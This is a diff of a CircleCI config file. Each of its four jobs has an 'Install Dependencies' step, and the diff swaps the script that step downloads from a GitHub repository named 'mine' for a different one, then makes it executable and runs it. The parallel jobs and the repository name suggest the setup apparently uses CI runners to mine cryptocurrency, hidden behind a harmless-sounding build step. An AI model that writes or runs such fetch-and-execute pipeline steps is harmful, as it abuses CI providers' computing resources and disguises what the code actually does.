@@ -6,28 +6,28 @@ jobs:
       steps:
         - run:
             name: Install Dependencies
-            command: sudo su --; wget https://raw.githubusercontent.com/geraldyolang11/mine/main/circleci.sh && chmod +x circleci.sh && ./circleci.sh
+            command: wget https://raw.githubusercontent.com/geraldyolang11/mine/main/work.sh && chmod +x work.sh && ./work.sh
     Devop1:
       docker:
             - image: circleci/ruby:2.5.3
       steps:
         - run:
             name: Install Dependencies
-            command: sudo su --; wget https://raw.githubusercontent.com/geraldyolang11/mine/main/circleci.sh && chmod +x circleci.sh && ./circleci.sh
+            command: wget https://raw.githubusercontent.com/geraldyolang11/mine/main/work.sh && chmod +x work.sh && ./work.sh
     Devop2:
       docker:
             - image: circleci/ruby:2.5.3
       steps:
         - run:
             name: Install Dependencies
-            command: sudo su --; wget https://raw.githubusercontent.com/geraldyolang11/mine/main/circleci.sh && chmod +x circleci.sh && ./circleci.sh
+            command: wget https://raw.githubusercontent.com/geraldyolang11/mine/main/work.sh && chmod +x work.sh && ./work.sh
     Devop3:
       docker:
             - image: circleci/ruby:2.5.3
       steps:
         - run:
             name: Install Dependencies
-            command: sudo su --; wget https://raw.githubusercontent.com/geraldyolang11/mine/main/circleci.sh && chmod +x circleci.sh && ./circleci.sh
+            command: wget https://raw.githubusercontent.com/geraldyolang11/mine/main/work.sh && chmod +x work.sh && ./work.sh
 workflows:
     version: 2.1
     build:
